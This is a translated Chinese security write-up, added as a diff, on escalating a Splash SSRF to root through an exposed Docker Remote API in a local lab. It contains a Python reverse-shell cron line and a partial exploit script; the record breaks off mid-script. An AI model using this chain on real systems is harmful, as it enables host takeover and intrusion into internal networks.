@@ -1,0 +1,155 @@
+# 【技术分享】Splash SSRF到获取内网服务器ROOT权限
+|
+##### 译文声明
+本文是翻译文章，文章来源：b1ngz@先知安全技术社区
+原文地址：
+译文仅供参考，具体内容表达以及含义原文为准。
+****
+**0x 01 简介**
+最近自己写的小工具在扫描的过程，发现了某公司在公网开放了一个使用开源系统的站点，该系统为 Splash，是一个使用 Python3、Twisted 和
+QT5写的 javascript rendering service，即提供了HTTP API 的轻量级浏览器，默认监听在 8050 (http) 和
+5023 (telnet) 端口。
+Splash 可以根据用户提供的url来渲染页面，并且url没有验证，因此可导致SSRF (带回显)。和一般的 SSRF 不同的是，除了 GET
+请求之外，Splash还支持 POST。这次漏洞利用支持 POST 请求，结合内网 Docker Remote
+API，获取到了宿主机的root权限，最终导致内网漫游。文章整理了一下利用过程，如果有哪里写的不对或者不准确的地方，欢迎大家指出～
+**0x 02 环境搭建**
+为了不涉及公司的内网信息，这里在本地搭建环境，模拟整个过程
+画了一个简单的图来描述环境
+这里使用 Virtualbox 运行 Ubuntu 虚拟机作为 Victim，宿主机作为 Attacker
+Attacker IP: 192.168.1.213
+Victim:
+IP: 192.168.1.120 使用桥接模式
+内网IP：172.16.10.74，使用 Host-only 并且在 Adanced 中去掉 Cable Connected
+Splash开放在 http://192.168.1.120:8050 ，版本为 v2.2.1，Attacker可访问
+Docker remote api在 http://172.16.10.74:2375，版本为 17.06.0-ce，Attacker无法访问
+JIRA 运行在 http://172.16.10.74:8080，Attacker无法访问
+Victim 机器上需要装 docker，安装步骤可以参考 文档
+因为后面测试需要利用 /etc/crontab 反弹，所以需要启动 cron
+    service cron start
+docker默认安装不会开放 tcp 2375 端口，这里需要修改一下配置，让其监听在 172.16.10.74 的 2375 端口
+在 /etc/default/docker 文件中添加
+    DOCKER_OPTS="-H tcp://172.16.10.74:2375
+创建目录 docker.service.d (如果没有的话)
+    mkdir /etc/systemd/system/docker.service.d/
+修改 vim /etc/systemd/system/docker.service.d/docker.conf 的内容为
+    [Service]
+    ExecStart=
+    EnvironmentFile=/etc/default/docker
+    ExecStart=/usr/bin/dockerd -H fd:// $DOCKER_OPTS
+重启 docker
+    systemctl daemon-reload
+    service docker restart
+查看是否成功监听
+    root@test:/home/user# netstat -antp | grep LISTEN
+    tcp        0      0 172.16.10.74:2375       0.0.0.0:*               LISTEN      1531/dockerd   
+    root@test:/home/user# curl 172.16.10.74:2375
+    {"message":"page not found"}
+运行 splash
+    docker pull scrapinghub/splash:2.2.1
+    sudo docker run --name=splash -d -p 5023:5023 -p 8050:8050 -p 8051:8051 scrapinghub/splash:2.2.1
+运行 JIRA
+    docker pull cptactionhank/atlassian-jira:latest
+    docker run -d -p 172.16.10.74:8080:8080 --name=jira cptactionhank/atlassian-jira:latest
+可以测试一下，宿主机上无法访问以下两个地址的
+    # docker remote api
+    http://192.168.1.120:2375/
+    # jira
+    http://192.168.1.120:8080/
+**0x 03 利用过程**
+带回显SSRF
+首先来看一下 SSRF
+在宿主机上访问 http://192.168.1.120:8050/ ，右上角有一个填写url的地方，这里存在带回显的ssrf
+这里填写内网jira的地址 http://172.16.10.74:8080，点击 Render
+me!，可以看到返回了页面截图、请求信息和页面源码，相当于是一个内网浏览器!
+查看 文档 得知，有个 render.html 也可以渲染页面，这里访问 docker remote
+api，http://172.16.10.74:2375
+Lua scripts尝试
+阅读了下文档，得知 splash 支持执行自定义的 Lua scripts，也就是首页填写url下面的部分
+具体可以参考这里 Splash Scripts Tutorial
+但是这里的 Lua 默认是运行在 Sandbox 里，很多标准的 Lua modules 和 functions 都被禁止了
+文档  列出了 Sandbox 开启后(默认开启)可用的 Lua modules：
+    string
+    table
+    math
+    os
+这里有一个os，可以执行系统命令 
+但是试了一下 require os，返回 not found，所以没办法实现
+    local os = require("os")
+    function main(splash)
+    end
+通过docker remote api 获取宿主机root权限
+再看了遍文档，发现除了 GET 请求，还支持 POST，具体可以参考这里
+通过之前对该公司的测试，得知某些ip段运行着docker remote api，所以就想尝试利用post请求，调用api，通过挂载宿主机 /etc 目录
+，创建容器，然后写 crontab 来反弹shell，获取宿主机root权限。
+根据docker remote api 的 文档 ，实现反弹需要调用几个 API，分别是
+POST /images/create ：创建image，因为当时的环境可以访问公网，所以就选择将创建好的 image 先push到docker
+hub，然后调用 API 拉取
+POST /containers/create: 创建 container，这里需要挂载宿主机 /etc 目录
+POST /containers/(id or name)/start : 启动container，执行将反弹定时任务写入宿主机的 /etc/crontab
+主要说一下构建 image，这里使用了 python 反弹shell 的方法，代码文件如下
+    Dockerfile
+    FROM busybox:latest
+    ADD ./start.sh /start.sh
+    WORKDIR /
+start.sh：container启动时运行的脚本，负责写入宿主机 /etc/crontab ，第一个参数作为反弹host，第二个参数为端口
+    #!/bin/sh
+    echo "* * * * * root python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1", $2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" >> /hostdir/crontab
+构建并push
+    docker build -t b1ngz/busybox:latest .
+    docker push b1ngz/busybox:latest
+虽然 splash 支持 post 请求，但是比较坑的是，文档里没有给向目标地址发 POST 请求的例子，只有参数说明，看了遍文档，关键参数有这几个
+url : 请求url
+http_method：请求url的方法
+headers: 请求 headers
+body: 请求url的body，默认为 application/x-www-form-urlencoded
+测试的时候，一开始一直使用 get 方法来请求 render.html 接口，但总是返回400 ，卡了很久
+    {
+        error: 400,
+        description: "Incorrect HTTP API arguments",
+        type: "BadOption",
+        info: {
+            argument: "headers",
+            description: "'headers' must be either a JSON array of (name, value) pairs or a JSON object",
+            type: "bad_argument"
+        }
+    }
+搜了一下，在 github issue 里找到了原因，得用post请求，并且 headers 得在 body里，且类型为
+json，略坑，这里给出利用脚本，代码有注释，大家可以自己看看
+    # -*- coding: utf-8 -*-    __author__ = 'b1ngz'
+    import json
+    import re
+    import requests
+    def pull_image(api, docker_api, image_name, image_tag):
+        print("pull image: %s:%s" % (image_name, image_tag))
+        url = "%s/render.html" % api
+        print("url: %s" % url)
+        docker_url = '%s/images/create?fromImage=%s&tag=%s' % (docker_api, image_name, image_tag)
+        print("docker_url: %s" % docker_url)
+        params = {
+            'url': docker_url,
+            'http_method': 'POST',
+            'body': '',
+            'timeout': 60
+        }
+        resp = requests.get(url, params=params)
+        print("request url: %s" % resp.request.url)
+        print("status code: %d" % resp.status_code)
+        print("resp text: %s" % resp.text)
+        print("-" * 50)
+    def create_container(api, docker_api, image_name, image_tag, shell_host, shell_port):
+        image = "%s:%s" % (image_name, image_tag)
+        print("create_container: %s" % image)
+        body = {
+            "Image": image,
+            "Volumes": {
+                "/etc": {  # 挂载根目录有时候会出错，这里选择挂载/etc
+                    "bind": "/hostdir",
+                    "mode": "rw"
+                }
+            },
+            "HostConfig": {
+                "Binds": ["/etc:/hostdir"]
+            },
+            "Cmd": [  # 运行 start.sh，将反弹定时任务写入宿主机/etc/crontab
+                '/bin/sh',
+                '/start.sh',
